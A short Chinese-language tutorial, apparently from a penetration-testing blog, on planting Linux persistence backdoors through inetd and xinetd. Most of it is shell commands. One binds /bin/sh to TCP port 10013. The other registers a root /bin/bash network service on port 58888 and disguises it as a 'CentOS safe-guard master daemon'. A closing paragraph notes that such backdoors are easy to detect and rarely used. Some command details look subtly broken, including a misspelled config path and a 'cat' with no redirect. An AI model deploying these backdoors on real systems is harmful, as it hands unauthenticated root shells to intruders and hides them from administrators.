(x)inetd是以前Linux发行版中的超级守护进程，它被用于接管tftp、telnet、rsync等服务。我们也可以一些持久化服务，让(x)inetd接管。



## inetd后门

执行以下命令会在10013端口开放一个后门。

```shell
echo "daytime stream tcp nowait /bin/sh sh –I" >> /etc/inetd.conf
echo "daytime   10013/tcp"  >> /etc/services
inetd
```



## xinetd后门



```shell
echo "safe-guard      58888/tcp               # CentOS safe-guard master daemon" >> /etc/services
cat /etc/xinet.d/safe-guard.xinetd<<EOF
# default: yes
# description: The safe-guard server servestelnet sessions;
service safe-guard
{
  flags = REUSE
  socket_type = stream
  wait = no
  user = root
  server =/bin/bash
  log_on_failure += USERID
  disable = no
}
EOF

/etc/init.d/xinetd restart
```



这种后门的隐蔽性也很一般，通过审计常用的开放监听端口及(x)inetd的配置文件即可很快的定位到本后门。同时，当前不少系统中都不含(x)inetd服务，因此实际场景下这种后门的使用很少见。